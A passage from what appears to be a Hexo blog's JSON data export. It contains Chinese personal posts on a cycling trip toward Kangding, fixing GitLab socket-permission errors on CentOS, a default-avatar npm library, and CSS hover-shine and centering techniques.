title=\"D4:泸定县\"></a>D4:泸定县</h2><p>去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。</p>\n<p>快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。</p>\n<p>过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。</p>\n<p>到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。</p>\n<h2 id=\"D5-康定县\"><a href=\"#D5-康定县\" class=\"headerlink\" title=\"D5:康定县\"></a>D5:康定县</h2><p>去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。</p>\n<p>最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。</p>\n<p>END</p>\n<p>现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。</p>\n<h2 id=\"出发\"><a href=\"#出发\" class=\"headerlink\" title=\"出发\"></a>出发</h2><p>5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。</p>\n<p>然后5号开始了川藏南线的骑行</p>\n<h2 id=\"D1-邛崃市\"><a href=\"#D1-邛崃市\" class=\"headerlink\" title=\"D1:邛崃市\"></a>D1:邛崃市</h2><p>一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。</p>\n<h2 id=\"D2-雅安市\"><a href=\"#D2-雅安市\" class=\"headerlink\" title=\"D2:雅安市\"></a>D2:雅安市</h2><p>后半段终于有山坡了，随处可见的茶园和酒厂。</p>\n<p>雅安也叫雨城，每天都会下阵雨。</p>\n<h2 id=\"D3-天全县紫石乡\"><a href=\"#D3-天全县紫石乡\" class=\"headerlink\" title=\"D3:天全县紫石乡\"></a>D3:天全县紫石乡</h2><p>天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。</p>\n<h2 id=\"D4-泸定县\"><a href=\"#D4-泸定县\" class=\"headerlink\" title=\"D4:泸定县\"></a>D4:泸定县</h2><p>去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。</p>\n<p>快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。</p>\n<p>过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。</p>\n<p>到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。</p>\n<h2 id=\"D5-康定县\"><a href=\"#D5-康定县\" class=\"headerlink\" title=\"D5:康定县\"></a>D5:康定县</h2><p>去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。</p>\n<p>最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。</p>\n<p>END</p>\n<p>现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。</p>\n"},{"title":"搭建gitlab服务","id":"314","date":"2016-06-05T23:24:51.000Z","_content":"\n为了搭建这个折腾了一天 >_&lt;\n\n## 有两种安装方式\n\n### YUM包快速安装\n\n官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。\n\n### gitlab源码配置安装\n\n需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂\n\n* * *\n\n我选择了YUM快速安装的方式，按照[centos7安装文档](https://about.gitlab.com/downloads/#centos7)来的。但是有个别地方出差错，这里整理一下。\n\n## 问题整理\n\n我遇到的大多数问题，都是sock文件的权限不够，比如`redis.sock`需要加上`chmod a+rx`权限才行。\n\n### 访问502错误\n\n这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题\n\n    /var/log/gitlab/nginx/gitlab_error.log\n    `</pre>\n\n    ### 访问500错误\n\n    可能是`redis`获取`pgsql`启动出错，查看 `production.log` 日志即可\n\n    <pre>`/var/log/gitlab/gitlab-rails/production.log\n    `</pre>\n\n    我遇到的是redis.sock的权限有误\n\n    <pre>`sudo chmod a+rw /var/opt/gitlab/redis/redis.socket\n    `</pre>\n\n    ### gitlab访问主机名的配置\n\n    编辑 `/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml`的`gitlab.host`项目\n\n    记得重启服务，需要等待1分钟：\n\n    <pre>`sudo gitlab-ctl restart\n\n接下来就可以用 http://git.xiaoai.me 访问了。\n\n如果想支持HTTPS，需要改下gitlab-nginx的配置`/var/opt/gitlab/nginx/conf/gitlab-http.conf`。或者给`gitlab-nginx`外层再套一个nginx，也好兼容机器上的其他网站。","source":"_posts/e6-90-ad-e5-bb-bagitlab-e6-9c-8d-e5-8a-a1.md","raw":"---\ntitle: 搭建gitlab服务\nid: 314\ncategories:\n  - linux\ndate: 2016-06-06 07:24:51\ntags:\n---\n\n为了搭建这个折腾了一天 >_&lt;\n\n## 有两种安装方式\n\n### YUM包快速安装\n\n官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。\n\n### gitlab源码配置安装\n\n需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂\n\n* * *\n\n我选择了YUM快速安装的方式，按照[centos7安装文档](https://about.gitlab.com/downloads/#centos7)来的。但是有个别地方出差错，这里整理一下。\n\n## 问题整理\n\n我遇到的大多数问题，都是sock文件的权限不够，比如`redis.sock`需要加上`chmod a+rx`权限才行。\n\n### 访问502错误\n\n这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题\n\n    /var/log/gitlab/nginx/gitlab_error.log\n    `</pre>\n\n    ### 访问500错误\n\n    可能是`redis`获取`pgsql`启动出错，查看 `production.log` 日志即可\n\n    <pre>`/var/log/gitlab/gitlab-rails/production.log\n    `</pre>\n\n    我遇到的是redis.sock的权限有误\n\n    <pre>`sudo chmod a+rw /var/opt/gitlab/redis/redis.socket\n    `</pre>\n\n    ### gitlab访问主机名的配置\n\n    编辑 `/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml`的`gitlab.host`项目\n\n    记得重启服务，需要等待1分钟：\n\n    <pre>`sudo gitlab-ctl restart\n\n接下来就可以用 http://git.xiaoai.me 访问了。\n\n如果想支持HTTPS，需要改下gitlab-nginx的配置`/var/opt/gitlab/nginx/conf/gitlab-http.conf`。或者给`gitlab-nginx`外层再套一个nginx，也好兼容机器上的其他网站。","slug":"e6-90-ad-e5-bb-bagitlab-e6-9c-8d-e5-8a-a1","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimz00hygmlmqh40gezz","content":"<p>为了搭建这个折腾了一天 &gt;_&lt;</p>\n<h2 id=\"有两种安装方式\"><a href=\"#有两种安装方式\" class=\"headerlink\" title=\"有两种安装方式\"></a>有两种安装方式</h2><h3 id=\"YUM包快速安装\"><a href=\"#YUM包快速安装\" class=\"headerlink\" title=\"YUM包快速安装\"></a>YUM包快速安装</h3><p>官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。</p>\n<h3 id=\"gitlab源码配置安装\"><a href=\"#gitlab源码配置安装\" class=\"headerlink\" title=\"gitlab源码配置安装\"></a>gitlab源码配置安装</h3><p>需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂</p>\n<hr>\n<p>我选择了YUM快速安装的方式，按照<a href=\"https://about.gitlab.com/downloads/#centos7\" target=\"_blank\" rel=\"noopener\">centos7安装文档</a>来的。但是有个别地方出差错，这里整理一下。</p>\n<h2 id=\"问题整理\"><a href=\"#问题整理\" class=\"headerlink\" title=\"问题整理\"></a>问题整理</h2><p>我遇到的大多数问题，都是sock文件的权限不够，比如<code>redis.sock</code>需要加上<code>chmod a+rx</code>权限才行。</p>\n<h3 id=\"访问502错误\"><a href=\"#访问502错误\" class=\"headerlink\" title=\"访问502错误\"></a>访问502错误</h3><p>这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题</p>\n<pre><code>/var/log/gitlab/nginx/gitlab_error.log\n`&lt;/pre&gt;\n\n### 访问500错误\n\n可能是`redis`获取`pgsql`启动出错，查看 `production.log` 日志即可\n\n&lt;pre&gt;`/var/log/gitlab/gitlab-rails/production.log\n`&lt;/pre&gt;\n\n我遇到的是redis.sock的权限有误\n\n&lt;pre&gt;`sudo chmod a+rw /var/opt/gitlab/redis/redis.socket\n`&lt;/pre&gt;\n\n### gitlab访问主机名的配置\n\n编辑 `/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml`的`gitlab.host`项目\n\n记得重启服务，需要等待1分钟：\n\n&lt;pre&gt;`sudo gitlab-ctl restart\n</code></pre><p>接下来就可以用 <a href=\"http://git.xiaoai.me\" target=\"_blank\" rel=\"noopener\">http://git.xiaoai.me</a> 访问了。</p>\n<p>如果想支持HTTPS，需要改下gitlab-nginx的配置<code>/var/opt/gitlab/nginx/conf/gitlab-http.conf</code>。或者给<code>gitlab-nginx</code>外层再套一个nginx，也好兼容机器上的其他网站。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>为了搭建这个折腾了一天 &gt;_&lt;</p>\n<h2 id=\"有两种安装方式\"><a href=\"#有两种安装方式\" class=\"headerlink\" title=\"有两种安装方式\"></a>有两种安装方式</h2><h3 id=\"YUM包快速安装\"><a href=\"#YUM包快速安装\" class=\"headerlink\" title=\"YUM包快速安装\"></a>YUM包快速安装</h3><p>官方推荐，但是集成了nginx,redis,pgsql，需要占用300M的空间。</p>\n<h3 id=\"gitlab源码配置安装\"><a href=\"#gitlab源码配置安装\" class=\"headerlink\" title=\"gitlab源码配置安装\"></a>gitlab源码配置安装</h3><p>需要自己安装配置redis,pgsql/mysql。这样轻便很多，但是流程非常复杂</p>\n<hr>\n<p>我选择了YUM快速安装的方式，按照<a href=\"https://about.gitlab.com/downloads/#centos7\" target=\"_blank\" rel=\"noopener\">centos7安装文档</a>来的。但是有个别地方出差错，这里整理一下。</p>\n<h2 id=\"问题整理\"><a href=\"#问题整理\" class=\"headerlink\" title=\"问题整理\"></a>问题整理</h2><p>我遇到的大多数问题，都是sock文件的权限不够，比如<code>redis.sock</code>需要加上<code>chmod a+rx</code>权限才行。</p>\n<h3 id=\"访问502错误\"><a href=\"#访问502错误\" class=\"headerlink\" title=\"访问502错误\"></a>访问502错误</h3><p>这个需要再等一分钟确认，如果还是502，则说明主服务启动出错了，也可能是ruby服务的sock文件权限问题</p>\n<pre><code>/var/log/gitlab/nginx/gitlab_error.log\n`&lt;/pre&gt;\n\n### 访问500错误\n\n可能是`redis`获取`pgsql`启动出错，查看 `production.log` 日志即可\n\n&lt;pre&gt;`/var/log/gitlab/gitlab-rails/production.log\n`&lt;/pre&gt;\n\n我遇到的是redis.sock的权限有误\n\n&lt;pre&gt;`sudo chmod a+rw /var/opt/gitlab/redis/redis.socket\n`&lt;/pre&gt;\n\n### gitlab访问主机名的配置\n\n编辑 `/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml`的`gitlab.host`项目\n\n记得重启服务，需要等待1分钟：\n\n&lt;pre&gt;`sudo gitlab-ctl restart\n</code></pre><p>接下来就可以用 <a href=\"http://git.xiaoai.me\" target=\"_blank\" rel=\"noopener\">http://git.xiaoai.me</a> 访问了。</p>\n<p>如果想支持HTTPS，需要改下gitlab-nginx的配置<code>/var/opt/gitlab/nginx/conf/gitlab-http.conf</code>。或者给<code>gitlab-nginx</code>外层再套一个nginx，也好兼容机器上的其他网站。</p>\n"},{"title":"用户名作为缺省的头像","id":"329","date":"2018-02-13T01:54:35.000Z","_content":"\n写了一个填充缺省头像的npm库：[https://github.com/joaner/namedavatar](https://github.com/joaner/namedavatar)\n\n在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。\n\n![](https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png)\n\n如果上传头像不存在，直接会在 `&lt;img&gt;` 标签上填充默认头像：\n<pre>&lt;img alt=\"李连杰\" width=\"32\"&gt;\n&lt;img src=\"./invalid.jpg\" alt=\"Tom Hanks\" width=\"40\"&gt;\n\n&lt;script&gt;\nrequirejs('namedavatar', function(namedavatar){\n  namedavatar.config({\n    nameType: 'lastName',\n  })\n  // set multi &lt;img&gt; use data-name attribute for full name\n  namedavatar.setImgs(document.querySelectorAll('img[alt]'), 'alt')\n})\n&lt;/script&gt;\n</pre>\n相比其它类似项目，首先对中文的支持更好。其次是直接在&lt;img&gt;标签上填充data URI，绿色无添加，应用成本更低。而且基于&lt;svg&gt;，没有用&lt;canvas&gt;渲染，性能也会好一点。\n\n&nbsp;\n\n### 还支持Vue.js的 directive 指令方式调用：\n\n<pre>import { directive } from 'namedavatar/vue'\n\n// register as directive\nVue.directive('avatar', directive);\n\n// in vue template\n&lt;template&gt;\n&lt;img v-avatar=\"'Tom Hanks'\" width=\"36\"/&gt;\n&lt;/template&gt;\n</pre>","source":"_posts/e7-94-a8-e6-88-b7-e5-90-8d-e4-bd-9c-e4-b8-ba-e7-bc-ba-e7-9c-81-e7-9a-84-e5-a4-b4-e5-83-8f.md","raw":"---\ntitle: 用户名作为缺省的头像\nid: 329\ncategories:\n  - 前端\ndate: 2018-02-13 09:54:35\ntags:\n---\n\n写了一个填充缺省头像的npm库：[https://github.com/joaner/namedavatar](https://github.com/joaner/namedavatar)\n\n在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。\n\n![](https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png)\n\n如果上传头像不存在，直接会在 `&lt;img&gt;` 标签上填充默认头像：\n<pre>&lt;img alt=\"李连杰\" width=\"32\"&gt;\n&lt;img src=\"./invalid.jpg\" alt=\"Tom Hanks\" width=\"40\"&gt;\n\n&lt;script&gt;\nrequirejs('namedavatar', function(namedavatar){\n  namedavatar.config({\n    nameType: 'lastName',\n  })\n  // set multi &lt;img&gt; use data-name attribute for full name\n  namedavatar.setImgs(document.querySelectorAll('img[alt]'), 'alt')\n})\n&lt;/script&gt;\n</pre>\n相比其它类似项目，首先对中文的支持更好。其次是直接在&lt;img&gt;标签上填充data URI，绿色无添加，应用成本更低。而且基于&lt;svg&gt;，没有用&lt;canvas&gt;渲染，性能也会好一点。\n\n&nbsp;\n\n### 还支持Vue.js的 directive 指令方式调用：\n\n<pre>import { directive } from 'namedavatar/vue'\n\n// register as directive\nVue.directive('avatar', directive);\n\n// in vue template\n&lt;template&gt;\n&lt;img v-avatar=\"'Tom Hanks'\" width=\"36\"/&gt;\n&lt;/template&gt;\n</pre>","slug":"e7-94-a8-e6-88-b7-e5-90-8d-e4-bd-9c-e4-b8-ba-e7-bc-ba-e7-9c-81-e7-9a-84-e5-a4-b4-e5-83-8f","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cin000i0gmlmdopjliq9","content":"<p>写了一个填充缺省头像的npm库：<a href=\"https://github.com/joaner/namedavatar\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner/namedavatar</a></p>\n<p>在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。</p>\n<p><img src=\"https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png\" alt=\"\"></p>\n<p>如果上传头像不存在，直接会在 <code>&amp;lt;img&amp;gt;</code> 标签上填充默认头像：</p>\n<pre>&lt;img alt=\"李连杰\" width=\"32\"&gt;\n&lt;img src=\"./invalid.jpg\" alt=\"Tom Hanks\" width=\"40\"&gt;\n\n&lt;script&gt;\nrequirejs('namedavatar', function(namedavatar){\n  namedavatar.config({\n    nameType: 'lastName',\n  })\n  // set multi &lt;img&gt; use data-name attribute for full name\n  namedavatar.setImgs(document.querySelectorAll('img[alt]'), 'alt')\n})\n&lt;/script&gt;\n</pre>\n相比其它类似项目，首先对中文的支持更好。其次是直接在&lt;img&gt;标签上填充data URI，绿色无添加，应用成本更低。而且基于&lt;svg&gt;，没有用&lt;canvas&gt;渲染，性能也会好一点。\n\n&nbsp;\n\n### 还支持Vue.js的 directive 指令方式调用：\n\n<pre>import { directive } from 'namedavatar/vue'\n\n// register as directive\nVue.directive('avatar', directive);\n\n// in vue template\n&lt;template&gt;\n&lt;img v-avatar=\"'Tom Hanks'\" width=\"36\"/&gt;\n&lt;/template&gt;\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>写了一个填充缺省头像的npm库：<a href=\"https://github.com/joaner/namedavatar\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner/namedavatar</a></p>\n<p>在我的不少项目中，都有缺省头像的问题。为了保持个性和方便辨认，会给没有头像的用户填充带名字的头像。</p>\n<p><img src=\"https://xiaoai.me/wp-content/uploads/2018/02/68747470733a2f2f7261772e6769746875622e636f6d2f6a6f616e65722f6e616d65646176617461722f6d61737465722f64656d6f2e706e67-720x107.png\" alt=\"\"></p>\n<p>如果上传头像不存在，直接会在 <code>&amp;lt;img&amp;gt;</code> 标签上填充默认头像：</p>\n<pre>&lt;img alt=\"李连杰\" width=\"32\"&gt;\n&lt;img src=\"./invalid.jpg\" alt=\"Tom Hanks\" width=\"40\"&gt;\n\n&lt;script&gt;\nrequirejs('namedavatar', function(namedavatar){\n  namedavatar.config({\n    nameType: 'lastName',\n  })\n  // set multi &lt;img&gt; use data-name attribute for full name\n  namedavatar.setImgs(document.querySelectorAll('img[alt]'), 'alt')\n})\n&lt;/script&gt;\n</pre>\n相比其它类似项目，首先对中文的支持更好。其次是直接在&lt;img&gt;标签上填充data URI，绿色无添加，应用成本更低。而且基于&lt;svg&gt;，没有用&lt;canvas&gt;渲染，性能也会好一点。\n\n&nbsp;\n\n### 还支持Vue.js的 directive 指令方式调用：\n\n<pre>import { directive } from 'namedavatar/vue'\n\n// register as directive\nVue.directive('avatar', directive);\n\n// in vue template\n&lt;template&gt;\n&lt;img v-avatar=\"'Tom Hanks'\" width=\"36\"/&gt;\n&lt;/template&gt;\n</pre>"},{"title":"CSS3封面闪光的效果","id":"323","date":"2018-01-21T08:03:01.000Z","_content":"\n鼠标移到封面图片上时，一个光线扫射过的小demo。\n\n### 效果预览\n\n[https://codepen.io/joaner/pen/YYBNpw](https://codepen.io/joaner/pen/YYBNpw)\n\n    &lt;div class=\"thumb\"&gt;\n      &lt;img src=\"http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg\" /&gt;\n    &lt;/div&gt;`</pre>\n\n    ### 光线\n\n    可以用`.thumb::before`来展示光线\n\n    首先需要创建光线的元素，使用线性左右渐进[linear-gradient](https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient)\n    <pre>`background: linear-gradient(\n        to right, \n        transparent 0%, \n        rgba(255,255,255,.5) 50%,\n        transparent 100%\n    );\n    `</pre>\n    其次光线一般是斜射，使用 [transform: skewX(145deg)](https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform) 来偏移角度\n\n    完整光线的代码：\n    <pre>`.thumb {\n      position: relative;\n    }\n    .thumb img {\n      width: 100%;\n    }\n\n    .thumb::before {\n      content: '';\n      display: inline-block;\n      position: absolute;\n      left: -120px;\n      top: 0;\n      width: 60px;\n      height: 100%;\n      background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);\n      transform: skewX(145deg);\n    }\n    `</pre>\n\n    ### 动画\n\n    这个光线动画由于是单向不可逆的，不适合用`transition`方案。\n\n    `animation`方案\n    <pre>`.thumb:hover::before {\n      animation-name: light;\n      animation-timing-function: linear;\n      animation-duration: .5s;\n    }\n\n    @keyframes light {\n      from {\n        left: -120px;\n      }\n      to {\n        left: 100%;\n      }\n    }\n    ","source":"_posts/css3-e5-b0-81-e9-9d-a2-e9-97-aa-e5-85-89-e7-9a-84-e6-95-88-e6-9e-9c.md","raw":"---\ntitle: CSS3封面闪光的效果\nid: 323\ncategories:\n  - 前端\ndate: 2018-01-21 16:03:01\ntags:\n---\n\n鼠标移到封面图片上时，一个光线扫射过的小demo。\n\n### 效果预览\n\n[https://codepen.io/joaner/pen/YYBNpw](https://codepen.io/joaner/pen/YYBNpw)\n\n    &lt;div class=\"thumb\"&gt;\n      &lt;img src=\"http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg\" /&gt;\n    &lt;/div&gt;`</pre>\n\n    ### 光线\n\n    可以用`.thumb::before`来展示光线\n\n    首先需要创建光线的元素，使用线性左右渐进[linear-gradient](https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient)\n    <pre>`background: linear-gradient(\n        to right, \n        transparent 0%, \n        rgba(255,255,255,.5) 50%,\n        transparent 100%\n    );\n    `</pre>\n    其次光线一般是斜射，使用 [transform: skewX(145deg)](https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform) 来偏移角度\n\n    完整光线的代码：\n    <pre>`.thumb {\n      position: relative;\n    }\n    .thumb img {\n      width: 100%;\n    }\n\n    .thumb::before {\n      content: '';\n      display: inline-block;\n      position: absolute;\n      left: -120px;\n      top: 0;\n      width: 60px;\n      height: 100%;\n      background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);\n      transform: skewX(145deg);\n    }\n    `</pre>\n\n    ### 动画\n\n    这个光线动画由于是单向不可逆的，不适合用`transition`方案。\n\n    `animation`方案\n    <pre>`.thumb:hover::before {\n      animation-name: light;\n      animation-timing-function: linear;\n      animation-duration: .5s;\n    }\n\n    @keyframes light {\n      from {\n        left: -120px;\n      }\n      to {\n        left: 100%;\n      }\n    }\n    ","slug":"css3-e5-b0-81-e9-9d-a2-e9-97-aa-e5-85-89-e7-9a-84-e6-95-88-e6-9e-9c","published":1,"updated":"2018-03-05T11:32:58.737Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cin100i2gmlmyud9a34p","content":"<p>鼠标移到封面图片上时，一个光线扫射过的小demo。</p>\n<h3 id=\"效果预览\"><a href=\"#效果预览\" class=\"headerlink\" title=\"效果预览\"></a>效果预览</h3><p><a href=\"https://codepen.io/joaner/pen/YYBNpw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/YYBNpw</a></p>\n<pre><code>&amp;lt;div class=&quot;thumb&quot;&amp;gt;\n  &amp;lt;img src=&quot;http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg&quot; /&amp;gt;\n&amp;lt;/div&amp;gt;`&lt;/pre&gt;\n\n### 光线\n\n可以用`.thumb::before`来展示光线\n\n首先需要创建光线的元素，使用线性左右渐进[linear-gradient](https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient)\n&lt;pre&gt;`background: linear-gradient(\n    to right, \n    transparent 0%, \n    rgba(255,255,255,.5) 50%,\n    transparent 100%\n);\n`&lt;/pre&gt;\n其次光线一般是斜射，使用 [transform: skewX(145deg)](https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform) 来偏移角度\n\n完整光线的代码：\n&lt;pre&gt;`.thumb {\n  position: relative;\n}\n.thumb img {\n  width: 100%;\n}\n\n.thumb::before {\n  content: &apos;&apos;;\n  display: inline-block;\n  position: absolute;\n  left: -120px;\n  top: 0;\n  width: 60px;\n  height: 100%;\n  background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);\n  transform: skewX(145deg);\n}\n`&lt;/pre&gt;\n\n### 动画\n\n这个光线动画由于是单向不可逆的，不适合用`transition`方案。\n\n`animation`方案\n&lt;pre&gt;`.thumb:hover::before {\n  animation-name: light;\n  animation-timing-function: linear;\n  animation-duration: .5s;\n}\n\n@keyframes light {\n  from {\n    left: -120px;\n  }\n  to {\n    left: 100%;\n  }\n}\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>鼠标移到封面图片上时，一个光线扫射过的小demo。</p>\n<h3 id=\"效果预览\"><a href=\"#效果预览\" class=\"headerlink\" title=\"效果预览\"></a>效果预览</h3><p><a href=\"https://codepen.io/joaner/pen/YYBNpw\" target=\"_blank\" rel=\"noopener\">https://codepen.io/joaner/pen/YYBNpw</a></p>\n<pre><code>&amp;lt;div class=&quot;thumb&quot;&amp;gt;\n  &amp;lt;img src=&quot;http://img31.mtime.cn/mt/2014/02/22/235109.78042753_96X128.jpg&quot; /&amp;gt;\n&amp;lt;/div&amp;gt;`&lt;/pre&gt;\n\n### 光线\n\n可以用`.thumb::before`来展示光线\n\n首先需要创建光线的元素，使用线性左右渐进[linear-gradient](https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient)\n&lt;pre&gt;`background: linear-gradient(\n    to right, \n    transparent 0%, \n    rgba(255,255,255,.5) 50%,\n    transparent 100%\n);\n`&lt;/pre&gt;\n其次光线一般是斜射，使用 [transform: skewX(145deg)](https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform) 来偏移角度\n\n完整光线的代码：\n&lt;pre&gt;`.thumb {\n  position: relative;\n}\n.thumb img {\n  width: 100%;\n}\n\n.thumb::before {\n  content: &apos;&apos;;\n  display: inline-block;\n  position: absolute;\n  left: -120px;\n  top: 0;\n  width: 60px;\n  height: 100%;\n  background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);\n  transform: skewX(145deg);\n}\n`&lt;/pre&gt;\n\n### 动画\n\n这个光线动画由于是单向不可逆的，不适合用`transition`方案。\n\n`animation`方案\n&lt;pre&gt;`.thumb:hover::before {\n  animation-name: light;\n  animation-timing-function: linear;\n  animation-duration: .5s;\n}\n\n@keyframes light {\n  from {\n    left: -120px;\n  }\n  to {\n    left: 100%;\n  }\n}\n</code></pre>"},{"title":"css垂直水平居中复习","id":"338","date":"2018-02-16T13:45:42.000Z","_content":"\n对于父容器高宽未知的居中方案，我了解的有四种\n\n在codepen上重新手写了一遍复习：[https://codepen.io/joaner/pen/ddZQQw](https://codepen.io/joaner/pen/ddZQQw)\n<pre>&lt;div class=\"examples\"&gt;\n &lt;!-- table-cell +vertical-align: middle --&gt;\n &lt;div&gt;\n &lt;div style=\"display: table; width: 100%; height: 100%;\"&gt;\n &lt;span style=\"display: table-cell; vertical-align: middle; text-align: center;\"&gt;table-cell&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n\n &lt;!-- flex + align-items +justify-content --&gt;\n &lt;div&gt;\n &lt;div style=\"display: flex; align-items: center; justify-content: center; height: 100%;\"&gt;\n &lt;span&gt;flexbox&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n\n &lt;!-- absolute + margin: auto --&gt;\n &lt;div&gt;\n &lt;div style=\"position: relative; height: 100%\"&gt;\n &lt;span style=\"position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;\"&gt;position&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n\n &lt;!-- transform: translate(-50%, -50%) --&gt;\n &lt;div&gt;\n &lt;div style=\"position: relative; height: 100%;\"&gt;\n &lt;span style=\"position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)\"&gt;transform&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n&lt;/div&gt;</pre>\n以上，我习惯用的 `table-cell` 和 `position: absolute + margin: auto` 方案，因为以前在IE下兼容性好些。\n\n但现在大多数浏览器都支持`flexbox`，更加推荐这个方案，适用性更强。","source":"_posts/css-e5-9e-82-e7-9b-b4-e6-b0-b4-e5-b9-b3-e5-b1-85-e4-b8-ad-e5-a4-8d-e4-b9-a0.md","raw":"---\ntitle: css垂直水平居中复习\nid: 338\ncategories:\n  - 前端\ndate: 2018-02-16 21:45:42\ntags:\n---\n\n对于父容器高宽未知的居中方案，我了解的有四种\n\n在codepen上重新手写了一遍复习：[https://codepen.io/joaner/pen/ddZQQw](https://codepen.io/joaner/pen/ddZQQw)\n<pre>&lt;div class=\"examples\"&gt;\n &lt;!-- table-cell +vertical-align: middle --&gt;\n &lt;div&gt;\n &lt;div style=\"display: table; width: 100%; height: 100%;\"&gt;\n &lt;span style=\"display: table-cell; vertical-align: middle; text-align: center;\"&gt;table-cell&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n\n &lt;!-- flex + align-items +justify-content --&gt;\n &lt;div&gt;\n &lt;div style=\"display: flex; align-items: center; justify-content: center; height: 100%;\"&gt;\n &lt;span&gt;flexbox&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n\n &lt;!-- absolute + margin: auto --&gt;\n &lt;div&gt;\n &lt;div style=\"position: relative; height: 100%\"&gt;\n &lt;span style=\"position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 70px; height: 20px;\"&gt;position&lt;/span&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n\n &lt;!-- transform: translate(-50%, -50%) --&gt;\n &lt;div&gt;\n &lt;div style=\"position: relative; height: 100%;\"&gt;\n &lt;span style=\"position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%)\"&gt;transform&lt;/span&gt;\n 